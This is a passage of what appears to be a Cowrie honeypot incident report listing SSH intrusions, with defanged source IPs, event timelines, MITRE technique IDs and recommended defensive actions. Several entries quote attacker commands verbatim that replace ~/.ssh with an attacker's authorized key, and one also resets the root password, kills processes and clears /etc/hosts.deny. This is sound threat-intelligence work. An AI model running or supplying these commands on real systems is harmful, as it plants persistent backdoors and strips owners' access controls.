| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:28:53` | `cowrie.session.connect` |
| `2026-06-07 14:28:53` | `cowrie.client.version` |
| `2026-06-07 14:28:53` | `cowrie.client.kex` |
| `2026-06-07 14:28:54` | `cowrie.login.success` |
| `2026-06-07 14:28:54` | `cowrie.session.params` |
| `2026-06-07 14:28:54` | `cowrie.command.input` |
| `2026-06-07 14:28:54` | `cowrie.command.failed` |
| `2026-06-07 14:28:55` | `cowrie.log.closed` |
| `2026-06-07 14:28:55` | `cowrie.session.params` |
| `2026-06-07 14:28:55` | `cowrie.command.input` |
| `2026-06-07 14:28:55` | `cowrie.session.file_download` |
| `2026-06-07 14:28:55` | `cowrie.log.closed` |
| `2026-06-07 14:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4375eb4c3b12

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:28 |
| **Last Seen** | 2026-06-07 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:28:58` | `cowrie.session.connect` |
| `2026-06-07 14:28:58` | `cowrie.client.version` |
| `2026-06-07 14:28:58` | `cowrie.client.kex` |
| `2026-06-07 14:28:59` | `cowrie.login.success` |
| `2026-06-07 14:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff84ce3b694e

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:32 |
| **Last Seen** | 2026-06-07 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:32:25` | `cowrie.session.connect` |
| `2026-06-07 14:32:25` | `cowrie.client.version` |
| `2026-06-07 14:32:25` | `cowrie.client.kex` |
| `2026-06-07 14:32:25` | `cowrie.login.success` |
| `2026-06-07 14:32:25` | `cowrie.session.params` |
| `2026-06-07 14:32:25` | `cowrie.command.input` |
| `2026-06-07 14:32:25` | `cowrie.command.failed` |
| `2026-06-07 14:32:25` | `cowrie.log.closed` |
| `2026-06-07 14:32:25` | `cowrie.session.params` |
| `2026-06-07 14:32:25` | `cowrie.command.input` |
| `2026-06-07 14:32:25` | `cowrie.session.file_download` |
| `2026-06-07 14:32:25` | `cowrie.log.closed` |
| `2026-06-07 14:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a611f83e4cbd

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 14:32 |
| **Last Seen** | 2026-06-07 14:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:32:26` | `cowrie.session.connect` |
| `2026-06-07 14:32:26` | `cowrie.client.version` |
| `2026-06-07 14:32:26` | `cowrie.client.kex` |
| `2026-06-07 14:32:26` | `cowrie.login.success` |
| `2026-06-07 14:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.244.18[.]126` to AbuseIPDB if not already reported
- [ ] Block `20.244.18[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054161c36b6e

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:36 |
| **Last Seen** | 2026-06-07 14:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:36:04` | `cowrie.session.connect` |
| `2026-06-07 14:36:04` | `cowrie.client.version` |
| `2026-06-07 14:36:05` | `cowrie.client.kex` |
| `2026-06-07 14:36:05` | `cowrie.login.success` |
| `2026-06-07 14:36:05` | `cowrie.session.params` |
| `2026-06-07 14:36:05` | `cowrie.command.input` |
| `2026-06-07 14:36:05` | `cowrie.command.failed` |
| `2026-06-07 14:36:06` | `cowrie.log.closed` |
| `2026-06-07 14:36:06` | `cowrie.session.params` |
| `2026-06-07 14:36:06` | `cowrie.command.input` |
| `2026-06-07 14:36:06` | `cowrie.session.file_download` |
| `2026-06-07 14:36:06` | `cowrie.log.closed` |
| `2026-06-07 14:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519a09684326

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:36 |
| **Last Seen** | 2026-06-07 14:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:36:12` | `cowrie.session.connect` |
| `2026-06-07 14:36:12` | `cowrie.client.version` |
| `2026-06-07 14:36:12` | `cowrie.client.kex` |
| `2026-06-07 14:36:13` | `cowrie.login.success` |
| `2026-06-07 14:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535f41317ec4

| Field | Detail |
|---|---|
| **Source IP** | `217.154.180[.]67` |
| **First Seen** | 2026-06-07 14:57 |
| **Last Seen** | 2026-06-07 14:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:KwZ6YG1Uyd6d"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 14:57:56` | `cowrie.session.connect` |
| `2026-06-07 14:57:56` | `cowrie.client.version` |
| `2026-06-07 14:57:56` | `cowrie.client.kex` |
| `2026-06-07 14:57:57` | `cowrie.login.success` |
| `2026-06-07 14:57:57` | `cowrie.session.params` |
| `2026-06-07 14:57:57` | `cowrie.command.input` |
| `2026-06-07 14:57:57` | `cowrie.command.failed` |
| `2026-06-07 14:57:57` | `cowrie.log.closed` |
| `2026-06-07 14:57:58` | `cowrie.session.params` |
| `2026-06-07 14:57:58` | `cowrie.command.input` |
| `2026-06-07 14:57:58` | `cowrie.session.file_download` |
| `2026-06-07 14:57:58` | `cowrie.log.closed` |
| `2026-06-07 14:58:08` | `cowrie.session.params` |
| `2026-06-07 14:58:08` | `cowrie.command.input` |
| `2026-06-07 14:58:08` | `cowrie.log.closed` |
| `2026-06-07 14:58:08` | `cowrie.session.params` |
| `2026-06-07 14:58:08` | `cowrie.command.input` |
| `2026-06-07 14:58:09` | `cowrie.log.closed` |
| `2026-06-07 14:58:09` | `cowrie.session.params` |
| `2026-06-07 14:58:09` | `cowrie.command.input` |
| `2026-06-07 14:58:09` | `cowrie.session.file_download` |
| `2026-06-07 14:58:09` | `cowrie.log.closed` |
| `2026-06-07 14:58:09` | `cowrie.session.params` |
| `2026-06-07 14:58:09` | `cowrie.command.input` |
| `2026-06-07 14:58:10` | `cowrie.log.closed` |
| `2026-06-07 14:58:10` | `cowrie.session.params` |
| `2026-06-07 14:58:10` | `cowrie.command.input` |
| `2026-06-07 14:58:10` | `cowrie.log.closed` |
| `2026-06-07 14:58:10` | `cowrie.session.params` |
| `2026-06-07 14:58:10` | `cowrie.command.input` |
| `2026-06-07 14:58:10` | `cowrie.command.input` |
| `2026-06-07 14:58:11` | `cowrie.log.closed` |
| `2026-06-07 14:58:11` | `cowrie.session.params` |
| `2026-06-07 14:58:11` | `cowrie.command.input` |
| `2026-06-07 14:58:11` | `cowrie.log.closed` |
| `2026-06-07 14:58:11` | `cowrie.session.params` |
| `2026-06-07 14:58:11` | `cowrie.command.input` |
| `2026-06-07 14:58:12` | `cowrie.log.closed` |
| `2026-06-07 14:58:12` | `cowrie.session.params` |
| `2026-06-07 14:58:12` | `cowrie.command.input` |
| `2026-06-07 14:58:12` | `cowrie.log.closed` |
| `2026-06-07 14:58:12` | `cowrie.session.params` |
| `2026-06-07 14:58:12` | `cowrie.command.input` |
| `2026-06-07 14:58:13` | `cowrie.log.closed` |
| `2026-06-07 14:58:13` | `cowrie.session.params` |
| `2026-06-07 14:58:13` | `cowrie.command.input` |
| `2026-06-07 14:58:13` | `cowrie.log.closed` |
| `2026-06-07 14:58:13` | `cowrie.session.params` |
| `2026-06-07 14:58:13` | `cowrie.command.input` |
| `2026-06-07 14:58:14` | `cowrie.log.closed` |
| `2026-06-07 14:58:14` | `cowrie.session.params` |
| `2026-06-07 14:58:14` | `cowrie.command.input` |
| `2026-06-07 14:58:14` | `cowrie.log.closed` |
| `2026-06-07 14:58:14` | `cowrie.session.params` |
| `2026-06-07 14:58:14` | `cowrie.command.input` |
| `2026-06-07 14:58:15` | `cowrie.log.closed` |
| `2026-06-07 14:58:15` | `cowrie.session.params` |
| `2026-06-07 14:58:15` | `cowrie.command.input` |
| `2026-06-07 14:58:15` | `cowrie.log.closed` |
| `2026-06-07 14:58:15` | `cowrie.session.params` |
| `2026-06-07 14:58:15` | `cowrie.command.input` |
| `2026-06-07 14:58:15` | `cowrie.log.closed` |
| `2026-06-07 14:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.180[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.154.180[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bde250eee01

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:14 |
| **Last Seen** | 2026-06-07 15:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:14:08` | `cowrie.session.connect` |
| `2026-06-07 15:14:08` | `cowrie.client.version` |
| `2026-06-07 15:14:08` | `cowrie.client.kex` |
| `2026-06-07 15:14:09` | `cowrie.login.success` |
| `2026-06-07 15:14:10` | `cowrie.session.params` |
| `2026-06-07 15:14:10` | `cowrie.command.input` |
| `2026-06-07 15:14:10` | `cowrie.command.failed` |
| `2026-06-07 15:14:10` | `cowrie.log.closed` |
| `2026-06-07 15:14:10` | `cowrie.session.params` |
| `2026-06-07 15:14:10` | `cowrie.command.input` |
| `2026-06-07 15:14:10` | `cowrie.session.file_download` |
| `2026-06-07 15:14:10` | `cowrie.log.closed` |
| `2026-06-07 15:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de9c34ab9c15

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:14 |
| **Last Seen** | 2026-06-07 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:14:16` | `cowrie.session.connect` |
| `2026-06-07 15:14:16` | `cowrie.client.version` |
| `2026-06-07 15:14:16` | `cowrie.client.kex` |
| `2026-06-07 15:14:17` | `cowrie.login.success` |
| `2026-06-07 15:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e1907bedc0

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-06-07 15:15 |
| **Last Seen** | 2026-06-07 15:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:15:44` | `cowrie.session.connect` |
| `2026-06-07 15:15:44` | `cowrie.client.version` |
| `2026-06-07 15:15:44` | `cowrie.client.kex` |
| `2026-06-07 15:15:45` | `cowrie.login.success` |
| `2026-06-07 15:15:45` | `cowrie.session.params` |
| `2026-06-07 15:15:45` | `cowrie.command.input` |
| `2026-06-07 15:15:45` | `cowrie.command.failed` |
| `2026-06-07 15:15:45` | `cowrie.log.closed` |
| `2026-06-07 15:15:46` | `cowrie.session.params` |
| `2026-06-07 15:15:46` | `cowrie.command.input` |
| `2026-06-07 15:15:46` | `cowrie.session.file_download` |
| `2026-06-07 15:15:46` | `cowrie.log.closed` |
| `2026-06-07 15:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92dc0b06b8b

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-06-07 15:15 |
| **Last Seen** | 2026-06-07 15:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:15:48` | `cowrie.session.connect` |
| `2026-06-07 15:15:48` | `cowrie.client.version` |
| `2026-06-07 15:15:48` | `cowrie.client.kex` |
| `2026-06-07 15:15:49` | `cowrie.login.success` |
| `2026-06-07 15:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fd0de8dc38

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:16 |
| **Last Seen** | 2026-06-07 15:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:16:36` | `cowrie.session.connect` |
| `2026-06-07 15:16:36` | `cowrie.client.version` |
| `2026-06-07 15:16:36` | `cowrie.client.kex` |
| `2026-06-07 15:16:37` | `cowrie.login.success` |
| `2026-06-07 15:16:37` | `cowrie.session.params` |
| `2026-06-07 15:16:37` | `cowrie.command.input` |
| `2026-06-07 15:16:37` | `cowrie.command.failed` |
| `2026-06-07 15:16:38` | `cowrie.log.closed` |
| `2026-06-07 15:16:38` | `cowrie.session.params` |
| `2026-06-07 15:16:38` | `cowrie.command.input` |
| `2026-06-07 15:16:38` | `cowrie.session.file_download` |
| `2026-06-07 15:16:38` | `cowrie.log.closed` |
| `2026-06-07 15:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd039081130d

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:16 |
| **Last Seen** | 2026-06-07 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:16:41` | `cowrie.session.connect` |
| `2026-06-07 15:16:41` | `cowrie.client.version` |
| `2026-06-07 15:16:41` | `cowrie.client.kex` |
| `2026-06-07 15:16:42` | `cowrie.login.success` |
| `2026-06-07 15:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af083589442c

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-06-07 15:16 |
| **Last Seen** | 2026-06-07 15:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:16:51` | `cowrie.session.connect` |
| `2026-06-07 15:16:51` | `cowrie.client.version` |
| `2026-06-07 15:16:51` | `cowrie.client.kex` |
| `2026-06-07 15:16:52` | `cowrie.login.success` |
| `2026-06-07 15:16:52` | `cowrie.session.params` |
| `2026-06-07 15:16:52` | `cowrie.command.input` |
| `2026-06-07 15:16:52` | `cowrie.command.failed` |
| `2026-06-07 15:16:52` | `cowrie.log.closed` |
| `2026-06-07 15:16:52` | `cowrie.session.params` |
| `2026-06-07 15:16:52` | `cowrie.command.input` |
| `2026-06-07 15:16:52` | `cowrie.session.file_download` |
| `2026-06-07 15:16:52` | `cowrie.log.closed` |
| `2026-06-07 15:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-024b85c24772

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-06-07 15:16 |
| **Last Seen** | 2026-06-07 15:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
